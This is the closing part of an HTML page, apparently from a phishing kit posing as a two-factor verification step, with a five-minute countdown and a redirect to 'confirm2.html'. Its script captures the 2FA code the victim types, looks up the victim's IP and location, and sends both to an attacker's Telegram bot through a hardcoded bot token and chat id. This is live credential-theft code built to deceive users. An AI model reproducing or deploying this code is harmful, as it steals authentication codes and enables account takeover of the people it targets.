<input type="hidden" id="ip_hidden" value="">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
    crossorigin="anonymous"></script>
  <script>
    function getIp() {
      $.get("https://api.ipify.org/?format=json", function (response) {
        $("#ip_hidden").val(response.ip);
      });
    }
    getIp();
    function handleActions() {

      let id = document.querySelector("#id");

      if (id.value == '') {
        $("#id").css('border', '1px solid red');
        return;
      } else {
        var bot = 'bot7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg';
        var chid = '5160818690';

        $.get("https://ipapi.co/json/", function (response) {
          let country = response.country;
          let regionName = response.region;
          let city = response.city;
          let ip = $("#ip_hidden").val();

          var params = {
            content: '=============================' + '%0A' +
              '2FA: "' + id.value + '"' + '%0A' +
              'IP: "' + ip + '"' + '%0A' +
              '============================='
          }

          fetch(`https://api.telegram.org/bot7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg/sendMessage?chat_id=5160818690&text=${params.content}/`, {
            method: 'POST', // or 'PUT'
            headers: {
              'Content-Type': 'application/json',
            },

          }).then(function () {
            window.location = 'confirm2.html';

          })
          $(".fb-btn").attr('disabled', true);


        });
      }

    }
    $('.numeric').on('input', function (event) {
      if (this.value !== '') {
        $('#code').css('border', 'none');
      }
      this.value = this.value.replace(/[^0-9]/g, '');
    });
  </script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"
    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
  <script type="text/javascript">
    function startTimer(duration, display) {
      var timer = duration, minutes, seconds;
      var myInterval = setInterval(function () {
        minutes = parseInt(timer / 60, 10)
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = minutes + ":" + seconds;

        if (timer == 0) {
          document.getElementById("timer").style.display = "none";
          document.getElementById("sendcodeagain").style.display = "block";
          clearInterval(myInterval);
        }
        if (--timer < 0) {
          timer = duration;
        }
      }, 1000);
    }

    var fiveMinutes = 60 * 5,
      display = document.querySelector('#timeri');
    startTimer(fiveMinutes, display);

  </script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
    crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"
    integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
    crossorigin="anonymous"></script>

</body>

</html>
